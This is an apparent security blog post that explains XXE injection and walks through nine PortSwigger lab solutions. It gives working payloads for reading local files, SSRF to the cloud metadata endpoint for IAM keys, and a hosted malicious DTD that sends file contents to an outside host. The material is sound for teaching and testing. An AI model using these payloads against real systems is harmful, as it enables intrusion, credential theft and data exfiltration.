---
title: "XML external entity (XXE) injection"
date: 2026-10-26
draft: false
description: "Theory, testing methodology, bypass techniques and PortSwigger XML lab write-ups."
tags:
  - web
  - labs
categories:
  - methodology
---

## Description

XML (Extensible Markup Language) is a markup language designed to store and transport data in a structured, human-readable format. Unlike HTML, which is used to display data, XML is used to describe and carry data between systems. Many applications use it to exchange information between the browser and the server, and the server almost always processes that XML data with a standard library or platform API.

For XXE injection, the most important part is that an XML document can declare its own building blocks. Using a Document Type Definition (DTD), the document can declare custom entities — reusable values that the parser expands whenever they are referenced:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY name "GaDaK"> ]>
<stockCheck>
    <productId>&name;</productId>
    <storeId>1</storeId>
</stockCheck>
```

- `<!DOCTYPE foo [ ... ]>` — the document type declaration. This is the documentation type where our entities are defined.
- `<!ENTITY name "GaDaK">` — declares an entity named `name` with the value `GaDaK`.
- `&name;` — an entity reference. When the parser expands it, the value comes back out in the `<productId>` element.

Three main XML entity types must be understood for XXE injection: Internal, External and Parameter. The entity defined above is an **Internal** one.

- **Internal Entity** — declared and resolved inside the same document. Its value is written directly inside the DTD itself.

```xml
<!DOCTYPE foo [<!ENTITY name "GaDaK"> ]>
```

- **External Entity** — its value is loaded from outside the document. It is always marked with the `SYSTEM` keyword, and the value can be a local file path or a URL. This is the entity type that makes XXE injection possible.

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

- **Parameter Entity** — declared with a `%` prefix and can only be referenced inside the DTD itself, never in the document content.

```xml
<!DOCTYPE foo [<!ENTITY % param SYSTEM "http://<collaborator>"> %param; ]>
```

One more distinction worth knowing: general entities (`&name;`) are referenced in the document content, while parameter entities (`%name;`) are only referenced within the DTD.

### Files to Read First

When testing XXE file read, start with files that exist on almost every system so you can quickly confirm the read works:

- **Linux** : `/etc/passwd` — usernames, system accounts and shell information.
- **Windows** : `C:\windows\system32\drivers\etc\hosts` — confirms a Windows file read works.

### Error-Based XXE

In many real cases the application is blind: the defined entity is never returned in the response. This is where error-based XXE comes in — we leak data through error messages by making the parser throw an error whose message contains the file contents.

```bash
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>">
%eval;
%error;
```

- `%file;` — declares a parameter entity whose value is the local file. Declaring it does not read the file yet; the file is only read when the entity is referenced.
- `%eval;` — declares `eval` as a string that contains a new entity declaration. When `%eval;` is referenced, the parser substitutes that string into the DTD and re-parses it as a markup declaration, thereby defining `%error;`.
- `%error;` — its SYSTEM value is a deliberately nonexistent path: `file:///invalid/%file;`. When the parser resolves it, `%file;` gets expanded inside the URI first, so the path ends up containing the file contents. The parser fails to open it and throws a `FileNotFoundException` — and the error message contains the full path, meaning the file contents.
- If the application displays parsing errors in its response, the file contents come straight back to us.

`&#x25;` is just a character reference for `%`. It is needed because a literal `%` inside an entity value would break the syntax.

This technique works with our own malicious (remote) DTD hosted on an exploit server — as shown in Lab 6 — or, when we cannot host a DTD, by repurposing a legitimate DTD file that already exists on the server — as shown in Lab 9.

### White Box vs Black Box Approach

**Black Box** (no source code) — test systematically:

1. **File read test** — define an external entity for a well-known file such as `/etc/passwd` and reference it in each data value, one at a time, since any returned value may reflect it.
2. **Blind test** — define an external entity pointing to a system you control (Burp Collaborator) and monitor for DNS/HTTP interactions.
3. **XInclude** — if you cannot control the whole document, inject an XInclude payload into each parameter of the request.
4. **Content-Type switch** — change `Content-Type: application/json` (or `application/x-www-form-urlencoded`) to `application/xml` and reformat the body as XML.
5. **File upload** — SVG, DOCX and XLSX files contain XML subcomponents. Upload a malicious one and see how the server processes it (see Lab 8).

**White Box** (with source code) — look at how the XML parser is configured:

- `DocumentBuilderFactory` / `SAXParserFactory` (Java) flags such as `disallow-doctype-decl`, `external-general-entities`, `external-parameter-entities` and `xinclude` — if they are merely left enabled, the parser supports the dangerous features even when the application itself never uses them.
- PHP `libxml` entity loader settings; other platforms have equivalent options.
- Any place where user-supplied XML is parsed, or where user data is embedded into a server-side XML document (for example a back-end SOAP request).

### HackTricks - Things Worth Knowing

From [HackTricks - XXE (XML External Entity)](https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html):

- Local file read with `file://` entities and SSRF with `http://` entities.
- Base64-encoded exfiltration variants: wrapping the payload in a `data://` entity to hide it from filters.
- Availability attacks such as the Billion Laughs entity expansion.
- XXE inside exotic files: SVG images, DOCX/XLSX documents and SOAP messages.
- [dtd-finder](https://github.com/GoSecure/dtd-finder) — a list of DTD paths per operating system, plus ready-made payloads for repurposing them.

### PayloadsAllTheThings - Things Worth Knowing

From [PayloadsAllTheThings - XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md):

- Classic XXE payloads in several syntax shapes (with `<!ELEMENT foo ANY>`), plus a `data://` base64-encoded variant.
- PHP wrappers such as `php://filter/convert.base64-encode/resource=...` to read source files.
- XInclude payloads for when you cannot modify the `DOCTYPE`.
- Error-based XXE using a remote DTD you host, or a local DTD already on the target — Linux: `/usr/share/xml/fontconfig/fonts.dtd`, `/usr/share/yelp/dtd/docbookx.dtd`; Windows: `C:\Windows\System32\wbem\xml\cim20.dtd`.
- Blind out-of-band exfiltration, including over FTP for larger files.
- WAF bypasses: the XML encoding detection order (HTTP `Content-Type`, BOM, first bytes, XML declaration), converting the payload to UTF-16 with `iconv`, and switching JSON endpoints to XML by changing the `Content-Type`.
- Entity prefixes: general entities use `&` and work in document content; parameter entities use `%` and only work inside the DTD.

## PortSwigger XML Labs

### Lab 1 : Exploiting XXE using external entities to retrieve files

**Goal :** Inject an XML external entity to retrieve the contents of the `/etc/passwd` file.

**Analysis :** We can see there is a checkStock function and it uses an XML structure to show the available stocks.

![Lab 1 analysis](/images/XML/Lab1Analysis.png)

**Exploitation :**

The XML structure they use is:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>1</productId>
<storeId>1</storeId>
</stockCheck>
```

The payload we will use to get `/etc/passwd` is:

```xml
<!DOCTYPE stockCheck [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

Why do we know this is an external entity? Because of the `SYSTEM` keyword. In the internal example above, the entity value (`GaDaK`) is written inside the declaration itself. Here the declaration contains no value — it only points to a location outside the document (`file:///etc/passwd`), and the parser is the one that fetches that content. That is exactly what `SYSTEM` means: the entity value is loaded from an external source, which makes it an external entity.

`xxe` is the entity name, and `file:///etc/passwd` is the file location we want to read.

Then we must define the entity reference `&xxe;` to output the file back:

```xml
<productId>
&xxe;
</productId>
```

![Lab 1 - /etc/passwd retrieved](/images/XML/Lab1_XMLSuccess.png)

And the lab is solved.

### Lab 2 : Exploiting XXE to perform SSRF attacks

**Goal :** Exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

**Analysis :** We can see there is a checkStock function and it uses an XML structure to show the available stocks, same as in the above lab.

**Exploitation :**

We will write the external payload to reach out to the IP address `http://169.254.169.254/`, which can lead to an SSRF attack.

The payload we will use is:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```

This must be put near the XML version (right after the XML declaration line).

Full payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck><productId>
&xxe;
</productId><storeId>1</storeId></stockCheck>
```

When we send it, we can see there is an error which is: `Invalid product ID: latest`

![Lab 2 - first metadata request](/images/XML/Lab2payload_Inject1.png)

We assume `latest` is a directory and try to put it behind the URL. We keep seeing directory-name errors again and again, so we use all of them as directories one by one and the lab is solved.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>
&xxe;
</productId><storeId>1</storeId></stockCheck>
```

![Lab 2 - IAM secret access key revealed](/images/XML/Lab2Payload_Inject2.png)

### Lab 3 : Blind XXE with out-of-band interaction

**Goal :** Use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

**Analysis :** We have the check stock function as in the previous labs, but it will not show the result due to the lab description. So we will try with out-of-band interaction. You can think of the technique like this: instead of trying to exploit and read directly on the victim server, we send the request back to our own (exploit/Collaborator) server.

**Exploitation :**

The payload we will use is:

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://<burp-collaborator-server>" > ]>
```

Full XML structure:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://4462y5hx7iffegnasyzascnfk6qxeo2d.oastify.com" > ]>
<stockCheck>
  <productId>&ext;</productId>
  <storeId>1</storeId>
</stockCheck>
```

Then poll it back in the Burp Suite Collaborator.

![Lab 3 - DNS and HTTP interactions](/images/XML/Lab3DNS.png)

### Lab 4 : Blind XXE with out-of-band interaction via XML parameter entities

**Goal :** Use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

**Analysis :** The same behaviour as in the previous labs, so we try with the out-of-band technique described there.

**Exploitation :**

We try with the previous technique:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://oyqmspbh129z80humitumwhzeqki88wx.oastify.com" > ]>
<stockCheck>
  <productId>&ext;</productId>
  <storeId>1</storeId>
</stockCheck>
```

But this fails because in this lab we can only use entities that are referenced inside the DTD itself, so we change our payload to a parameter entity:

```xml
<!DOCTYPE foo [ <!ENTITY % ext SYSTEM "http://oyqmspbh129z80humitumwhzeqki88wx.oastify.com"> %ext; ]>
```

The `%` sign is what marks an entity as a parameter entity. `<!ENTITY % ext SYSTEM "http://...">` — the `%` before `ext` makes it a parameter entity declaration. `%ext;` — this is how you reference it. That reference is what triggers the parser to resolve the external URI and make the network request.

Full XML request:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % ext SYSTEM "http://oyqmspbh129z80humitumwhzeqki88wx.oastify.com"> %ext; ]>
<stockCheck>
  <productId>2</productId>
  <storeId>1</storeId>
</stockCheck>
```

If we send it like this and poll in the Burp Collaborator, we can see it works.

![Lab 4 - parameter entity poll works](/images/XML/Lab4_XML.png)

### Lab 5 : Exploiting blind XXE to exfiltrate data using a malicious external DTD

**Goal :** Exfiltrate the contents of the `/etc/hostname` file.

**Analysis :** We can see, as always, the stock check functionality and the XML structure.

**Exploitation :**

We try the previous technique with a parameter entity and we can see the poll works:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % ext SYSTEM "http://2y10s3bv1g9d8eh8mwt8mahde4kx8owd.oastify.com/"> %ext; ]>
<stockCheck>
  <productId>2</productId>
  <storeId>1</storeId>
</stockCheck>
```

So we will use that to read the file. In the lab exploit server we will write:

```bash
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://2y10s3bv1g9d8eh8mwt8mahde4kx8owd.oastify.com/?X=%file;'>">
%eval;
%exfil;
```

- `%file;` — declares a parameter entity whose value is the local file `/etc/hostname`. Declaring it does not read the file yet; the file is only read when the entity is referenced.
- `%eval;` — declares `eval` as a string that contains a new entity declaration. When `%eval;` is referenced, the parser substitutes that string into the DTD and re-parses it as a markup declaration, thereby defining `%exfil;`.
- `%exfil;` — referencing `exfil` causes the parser to fetch the URI `http://<url>/?X=<contents of /etc/hostname>`. Since `%file;` is inside the SYSTEM literal of `exfil`, it gets expanded before the HTTP request is made, so the file contents are sent to the attacker's server in the query string.

The content we want to read will show up in `X=<value>`. `&#x25;` is just a character reference for `%`.

In short: read `/etc/hostname` and leak it in `http://<url>/` in the URL query.

Then we send this request with the exploit server URL:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY % ext SYSTEM "https://exploit-0ae9004803ceb3a480cc57d201070057.exploit-server.net/exploit"> %ext; ]>
<stockCheck>
  <productId>2</productId>
  <storeId>1</storeId>
</stockCheck>
```

And we can see we got the content of `/etc/hostname`: `a334a3c6e0f4`.

![Lab 5 - hostname exfiltrated](/images/XML/Lab5_success.png)

### Lab 6 : Exploiting blind XXE to retrieve data via error messages

**Goal :** Use an external DTD to trigger an error message that displays the contents of the `/etc/passwd` file.

**Analysis :** We can see, as always, the stock check functionality and the XML structure.

**Exploitation :**

We try the previous technique with the parameter entity and send it:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % ext SYSTEM "http://t3xrxugm67e4d5mzrnyzr1m4jvppdf14.oastify.com"> %ext; ]>
<stockCheck>
  <productId>2</productId>
  <storeId>1</storeId>
</stockCheck>
```

But an error occurs which is really weird. The poll also works, but we will not need the Burp Collaborator if we can see the output we want in the errors.

![Lab 6 - a weird error appears](/images/XML/Lab6-1XML.png)

In the lab exploit server we will write:

```bash
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

This payload is like the previous one, but the difference is that instead of sending the contents to our exploit server, we use the errors to retrieve them.

`file:///invalid/%file;` — the path is deliberately nonexistent, so the parser throws a `FileNotFoundException` that shows the contents of `/etc/passwd`.

And then we use the exploit server URL like in the previous lab:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY % ext SYSTEM "https://exploit-0ae9004803ceb3a480cc57d201070057.exploit-server.net/exploit"> %ext; ]>
<stockCheck>
  <productId>2</productId>
  <storeId>1</storeId>
</stockCheck>
```

![Lab 6 - /etc/passwd leaked through the error](/images/XML/Lab6-2XML.png)

And then we can see the lab is solved.

### Lab 7 : Exploiting XInclude to retrieve files

**Goal :** Inject an XInclude statement to retrieve the contents of the `/etc/passwd` file.

**Analysis :** We can see there is a check stock function as before, but we cannot see any XML structure to manipulate. So we will try to inject the `%` sign into a parameter.

We can see the error happen: `Entities are not allowed for security reasons`.

![Lab 7 - entity injection blocked](/images/XML/Lab7-1XML.png)

So we will use XInclude, which is a W3C specification that allows you to build composite XML documents by merging separate XML files or plain text files into a single master document.

Example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<book xmlns:xi="http://www.w3.org/2001/XInclude">
    <title>The XML Guide</title>
    <xi:include href="chapters/chapter1.xml"/>
    <xi:include href="chapters/chapter2.xml"/>
</book>
```

To use XInclude, you must declare the official namespace `http://www.w3.org/2001/XInclude` (traditionally using the `xi:` prefix).

For more information and references, see this: `https://www.xml.com/pub/a/2002/07/31/xinclude.html`

**Exploitation :**

We will use XInclude to read the file we want.

Payload:

```xml
<test xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text" /></test>
```

- `<test ...></test>` — just a normal XML root element. The name does not matter.
- `xmlns:xi="http://www.w3.org/2001/XInclude"` — declares the `xi` namespace so the XML parser recognizes XInclude directives.
- `<xi:include ... />` — tells an XInclude-enabled XML parser: "include the contents of another resource here."
- `href="file:///etc/passwd"` — the resource to include is the local file `/etc/passwd` via the `file://` URI scheme.
- `parse="text"` — meaning the content is output back in text format.

```http
POST /product/stock HTTP/2
Host: 0a9a006b03024913826d6a8b008f004c.web-security-academy.net
Cookie: session=jIBjkNDUiK4tKb61MMI1Ooene1XdyPC9
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0a9a006b03024913826d6a8b008f004c.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 129
Origin: https://0a9a006b03024913826d6a8b008f004c.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

productId=1<test xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></test>&storeId=1
```

![Lab 7 - XInclude leaks /etc/passwd](/images/XML/Lab7-2XML.png)

This can reveal the file contents of `/etc/passwd` and the lab is solved.

Note: For a CTF challenge related to this vulnerability, you can read mine here - [Space X - UCSYCTF2026 Web](/posts/ucsyctf2026-web/#space-x-100-marks).

### Lab 8 : Exploiting XXE via image file upload

**Goal :** Display the contents of the `/etc/hostname` file after the server processes it.

**Analysis :** `Apache Batik` is a pure-Java, cross-platform open-source toolkit developed by the Apache Software Foundation for generating, rendering, manipulating, and converting Scalable Vector Graphics (SVG) images. So with this knowledge, we will try to abuse a malicious SVG file upload which will contain malicious XML payloads.

In the comment section we can see there is an image file upload section.

**Exploitation :**

The payload we will use:

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
  <image xlink:href="file:///etc/hostname"></image>
</svg>
```

More information for these kinds of payloads: `https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html`

We create an image file and put the above payload in the image content, as shown below:

![Lab 8 - malicious SVG upload](/images/XML/Lab8-1XML.png)

```text
SVG transcoder exited with an error: null
Enclosed Exception:
null:-1
The attribute &quot;width&quot; of the element &lt;image&gt; is required
```

But it fails, so we search for more information to understand. The above payload can be used when forcing an image renderer to process a text file, so we switch to a classic XXE structure inside the SVG:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg"
     width="300"
     height="200">
  <text x="10" y="20" font-size="16">&xxe;</text>
</svg>
```

The above payload uses a classic XXE structure. It defines an external entity `xxe` that points to `file:///etc/hostname`. Crucially, it references this entity inside a `<text>` element: `<text>&xxe;</text>`.

When Batik parses the SVG, its XML parser resolves the entity. It reads the contents of `/etc/hostname` and substitutes the `&xxe;` placeholder with the raw text before the rendering phase even begins. The SVG document effectively becomes a normal SVG with a `<text>` element containing the hostname string. Batik then simply renders that text into the avatar image.

![Lab 8 - SVG with the entity rendered](/images/XML/Lab8-2XML.png)

After we follow the redirection, go to the website and check the image URL path, we can see the content of `/etc/hostname` which is `17acf3d15c4d`.

![Lab 8 - avatar shows the hostname](/images/XML/Lab8-3XML.png)

And the lab is solved.

### Lab 9 : Exploiting XXE to retrieve data by repurposing a local DTD

**Goal :** Trigger an error message containing the contents of the `/etc/passwd` file.

**Analysis :**

Try with a regular entity:

```xml
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

But it fails when we use the reference `&xxe;`, so we try with a blind regular entity:

```xml
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://[burp-collaborator-server]">]>
```

But it still fails, so we try with a parameter entity:

```xml
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>
```

We get XML parser errors from this payload. We use this as an advantage and try to get `/etc/passwd`.

![Lab 9 - parser error with parameter entity](/images/XML/Lab9-1XML.png)

Repurposing the local DTD:

```xml
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/doesnotexist"> %xxe;]>
```

Why we use this payload: `file:///etc/doesnotexist` does not exist, so the parser must throw an error when we reference `%xxe;`. The goal is not to read a file — it is to confirm two things: (1) the parser accepts our parameter entity, and (2) when it fails, the error message shows the exact SYSTEM URI we control. Point 2 is the key to error-based exfiltration — if we can craft a URI that embeds another entity (`%file;`) inside the path, the file contents end up inside the error message shown to us.

![Lab 9 - error probe confirms the technique](/images/XML/Lab9-2XML.png)

Then we try to find an exactly matching local DTD path using Intruder. When attacking, we must not URL-encode the payloads — it is marked as default under the payload settings, as shown in the image, so try to unmark it.

The wordlist we will use: `https://raw.githubusercontent.com/GoSecure/dtd-finder/refs/heads/master/list/dtd_files.txt`

![Lab 9 - Intruder DTD path scan](/images/XML/Lab9-3XML.png)

We can see there is: `/usr/share/yelp/dtd/docbookx.dtd`

![Lab 9 - a local DTD is found](/images/XML/Lab9-4XML.png)

**Exploitation :**

```bash
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant 'aaa)>
            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
            &#x25;eval;
            &#x25;error;
            <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>Text</message>
```

How this payload works - step by step:

1. `<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">` — loads a legitimate DTD that already exists on the server. Since we cannot write files onto the target, we repurpose an existing one — this is the local DTD repurposing technique.
2. The original `fonts.dtd` declares a parameter entity: `<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'>`.
3. We declare our own `%constant` **before** `%local_dtd;` gets resolved. Because our declaration comes first, the parser uses our value instead of the original one.
4. Our injected value starts with `aaa)>`. The `)` and `>` characters close the original entity declaration early — everything after that (our nested declarations) is then parsed as part of the DTD itself.
5. `&#x25;` is a character reference for `%`. A literal `%` inside an entity value would be invalid syntax, so the escaped form is needed. `&#x26;#x25;` is the double-escaped form used inside `eval` so that, after the first substitution, the parser still sees `%`.
6. The final chain: `%error;` is defined with the SYSTEM value `file:///patt/%file;`. When `%error;` is referenced, the parser expands `%file;` (the contents of `/etc/passwd`) into the URI, tries to open that nonexistent path, and throws an error — the error message contains the whole path, meaning the file contents.

This payload is from PayloadsAllTheThings: `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#error-based---using-local-dtd-file`

![Lab 9 - /etc/passwd leaked through the local DTD error](/images/XML/Lab9-5XML.png)

And then we can see the lab is solved.
